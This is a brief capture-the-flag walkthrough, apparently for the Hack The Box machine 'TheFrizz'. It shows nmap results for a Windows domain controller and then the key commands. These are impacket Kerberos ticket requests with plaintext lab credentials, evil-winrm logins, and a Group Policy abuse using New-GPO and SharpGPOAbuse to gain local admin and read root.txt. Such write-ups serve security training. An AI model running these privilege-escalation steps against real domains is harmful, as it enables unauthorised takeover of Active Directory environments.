
![TheFrizz](https://github.com/user-attachments/assets/c6fe1166-528e-409b-8838-e7e2dc1b4959)


# basic scans overview 
          
          PORT      STATE SERVICE       REASON          VERSION
          22/tcp    open  ssh           syn-ack ttl 127 OpenSSH for_Windows_9.5 (protocol 2.0)
          53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
          80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
          | http-methods: 
          |_  Supported Methods: GET HEAD POST OPTIONS
          |_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/
          |_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
          88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-16 15:12:22Z)
          135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
          139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
          389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
          445/tcp   open  microsoft-ds? syn-ack ttl 127
          464/tcp   open  kpasswd5?     syn-ack ttl 127
          593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
          636/tcp   open  tcpwrapped    syn-ack ttl 127
          3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
          3269/tcp  open  tcpwrapped    syn-ack ttl 127
          5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
          |_http-server-header: Microsoft-HTTPAPI/2.0
          |_http-title: Not Found
          9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
          49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
          49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
          49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
          62860/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
          62869/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
          62895/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC


# Now sorry for this part , i forgot to write it , but the essential steps 
          
          impacket-getTGT frizz.htb/f.frizzle:Jenni_Luvs_Magic23 -dc-ip $victim 
          Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
          [*] Saving ticket in f.frizzle.ccache
          export KRB5CCNAME=f.frizzle.ccache
          evil-winrm -i frizzdc.frizz.htb -r FRIZZ.HTB -k f.frizzle.ccache
          
          
          
          impacket-getTGT frizz.htb/M.Schoolbus:'!suBcig@MehTed!R' -dc-ip $victim
          
          M.Schoolbus can write GPO
          New-GPO -Name pwn | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled Yes
          .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName pwn
gpupdate /force 

I had to reconnect a times via evil-winrm, before I was really local admin by the GPO abuse
type C:\Users/Administrator/Desktop/root.txt
